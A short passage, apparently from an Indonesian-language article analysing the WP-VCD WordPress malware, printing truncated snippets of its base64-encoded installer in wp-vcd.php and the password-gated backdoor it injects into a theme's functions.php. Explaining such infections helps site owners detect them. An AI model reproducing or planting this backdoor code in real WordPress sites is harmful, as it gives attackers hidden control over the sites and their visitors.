
$install_code = ‘c18615a1ef0e1cd813b388b4b6e29bcdc18615a1ef0e1cd813b388b4b6e29bcd[…..] $install_hash = md5($_SERVER[‘HTTP_HOST’] . AUTH_SALT); $install_code = str_replace(‘{$PASSWORD}’ , $install_hash, base64_decode( $install_code ));

Selain itu juga ada functions.php pada directory themes yang digunakan. Kamu bisa melihat bahwa script berikut terhubung ke wp-vcd.php.

<?php

if (isset($_REQUEST[‘action’]) && isset($_REQUEST[‘password’]) && ($_REQUEST[‘password’] == ‘f98cd901d7551a69caf41ba758a7c972’))

{

$div_code_name=”wp_vcd”;

switch ($_REQUEST[‘action’])

{

[……]

$div_code_name = “wp_vcd”;

$funcfile      = __FILE__;

if(!function_exists(‘theme_temp_setup’)) {

$path = $_SERVER[‘HTTP_HOST’] . $_SERVER[REQUEST_URI];

if (stripos($_SERVER[‘REQUEST_URI’], ‘wp-cron.php’) == false && stripos($_SERVER[‘REQUEST_URI’], ‘xmlrpc.php’) == false) {
